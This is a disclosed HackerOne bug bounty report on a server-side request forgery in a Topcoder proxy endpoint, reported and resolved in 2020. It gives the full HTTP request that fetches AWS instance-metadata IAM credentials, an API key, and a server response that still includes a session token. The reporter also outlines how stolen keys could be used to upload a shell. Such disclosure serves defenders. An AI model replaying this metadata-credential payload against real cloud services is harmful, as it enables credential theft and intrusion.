---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/server-side-request-forgery-ssrf
  - env/cloud
  - stack/aws
  - vuln/xss
  - vuln/ssrf
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2021-09-16
submitted: 2020-09-11T01:32:47.653Z
bounty_usd: null
votes: 30
cve: []
program: "[[programs/lab45|Lab45]]"
reporter: "zhh"
source: "https://hackerone.com/reports/978823"
title: "SSRF to AWS file read"
---
# SSRF to AWS file read

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 30 | **Program:** Lab45 | **Disclosed:** 2021-09-16

- Report: [https://hackerone.com/reports/978823](https://hackerone.com/reports/978823)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2020-09-11T01:32:47.653Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
after seeing the disclosure it looks like the bug was not fixed properly

## Steps To Reproduce:
copy and paste the request below and paste it into Burpsuite repeater

`GET /community-app-assets/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1
Host: cognitive.topcoder.com
Content-Length: 108
Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://cognitive.topcoder.com
Referer: http://cognitive.topcoder.com/ibm-cloud
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9`

`b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net`



##Response
`HTTP/1.1 200 OK
Date: Fri, 11 Sep 2020 01:28:12 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: AWSALB=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/
Set-Cookie: AWSALBCORS=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/; SameSite=None
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
ETag: W/"512-LkSYc5PU5Y4xWGPxqoM8orPaKK0"
Vary: Accept-Encoding
Content-Length: 1298`

`{
  "Code" : "Success",
  "LastUpdated" : "2020-09-11T00:36:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "[REDACTED - see source report]",
  "SecretAccessKey" : "[REDACTED - see source report]",
  "Token" : "IQoJb3JpZ2luX2VjEGEaCXVzLWVhc3QtMSJIMEYCIQD8srpZ/87c2HrLYddytORezee2NMx0/PWk4UH+2nahPgIhAOwlCmFgVAcdsUBpbDHI6McTLQcHlUnA/FAMOf5GoMWmKrQDCGoQABoMNDA5Mjc1MzM3MjQ3Igw+zvAcQIYJijsNTWsqkQMfVMu7kgOepBvF96NdZHk4KxICWOBDlrJN/MR9o3Hf6Ohst+4d/tbGeyCL7xClsepu+02nf/sX7Ggtx9ciqAg14OmsUWjzp4ZHntge0oi9AJpfyc76UVFNFdTwbo/hEEHKfjgC18lFW+E5DIP00Ifm7usFgLLABozP9Av/hJLwCWG7UHfnHicvc0eY9Tscc+RS4U0GWvUGGXji1vm/8ud5c7Ou6h2z2fo9fSODgq/c1sZReVtofuhSYOfpYtr4ByrHMVY78aR+VrF//6870MUJWNOI4EK3NFxtPH6HCJRmBwh3iVTqYI+vawove6BG3PmMkeyBZSqCqFCTuf+H/eEdw6orjNQ7BxurtB8ZaymaUABhNKfQTBeDBy8/G/wK75v7YZjPUmalMf89wGvshp5EHQVYySr3RGlS9Ti5FbIzR0Gl+5cLx/0AX6ce8L5UrXACpOLktOJe+l/W1KQchNOs9MEwSTYi+sa1qITd17XS9tp0BuRlZSX4MGQ0SJvDEmNvQq84avF4SLbqJLNZEVn0uDCkjev6BTrqAb5BqJ09VpgjlBloe0SAGp4uNlWheqWl+Vt3S+jcVRqf4LNAM3hbEvRB6pTt9itSE6l4y40QADcmMs0oWc6sm+oCG5enAkRxQBFYFDt+OvbxnSnQmaG3YDuRRJwpsaMA/V0TLqpQq5wvJMOssylXffenYIFpVIbZ5BQ5elDVqVpol/1fe+ej3slNvG6VqD3/OwLyNPjfAhdG3UmYzqyr3ym6uywn0KmLMY9esM7Mde5KA2LmgozCKpkV18u0LGCORGXGnllCWpuifVMYXoLQJgk8LCB5H6FbBbcqVvE5FGabClXZG3UIbhPsfg==",
  "Expiration" : "2020-09-11T06:47:23Z"
}`


## Supporting Material/References:
video PoC: F983368

## Impact

aws file read

## Timeline

- **Report Filed**
- **2020-09-11** @zhh: I might be able to upgrade this to RCE, by accessing the accesskey and secret key. then use that key to upload the shell to your bucket, but I wouldn't do that without the permission of the program owner.
- **2020-09-11** @bluetooth_headset: Hi @3viltwin,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@bluetooth_headset
- **2020-09-11** @bluetooth_headset: Hi @3viltwin - I'm discussing this submission internally with the Topcoder team. You will be updated as soon as there is additional information to share. Thanks for your patience!
- **2020-09-11** @zhh: 1. It looks like the link on the web is removed but the call to the endpoint remains active
2. my suggestion to fix, disable that endpoint too
3. as I said before, maybe it can be chain to rce (if allowed). the scenario is like => I get access key and secret key (SSRF) => use this key to access bucket => upload shell (RCE).
- **2020-09-14** @zhh: hi i made a direct call to the endpoint and it shows 403, i think this bug has been fixed, i also tried the endpoint to call the collaborator and it still shows 403. can you review my report and you can check it too

`GET /community-app-assets/api/proxy-post?url=http%3A%2F%2F169.254.169.254 HTTP/1.1
Host: cognitive.topcoder.com
Content-Length: 108
Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://cognitive.topcoder.com
Referer: http://cognitive.topcoder.com/ibm-cloud
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9`

`b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net`


response


`HTTP/1.1 403 Forbidden
Server: awselb/2.0
Date: Mon, 14 Sep 2020 03:35:07 GMT
Content-Type: text/html
Content-Length: 536
Connection: keep-alive`

`<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->`

screenshot: F987003
- **2020-09-14** @bluetooth_headset: Hi @3viltwin - Thanks for sharing this information with us. We are still looking into this report and will update you when we have additional information to share. Thanks for your patience!
- **Report Resolved**
- **2020-09-22** @zhh: can i write this on my blog?
- **2020-09-22** @jwheeler: Of course. I appreciate you asking. Thanks for being so quick to point out that this was not fixed as I first thought.
- **2020-09-22** @zhh: Thank you sir, can I also include my PoC video in the blog too?
- **2020-09-24** @jwheeler: Yes.
- **2021-09-15** @zhh: Hi,
can this be `disclose in a limited` way?.

thank you
- **Agreed On Going Public**
- **2021-09-16** @zhh: can the report be disclosed in a limited?
- **Agreed On Going Public**
- **Report Became Public**
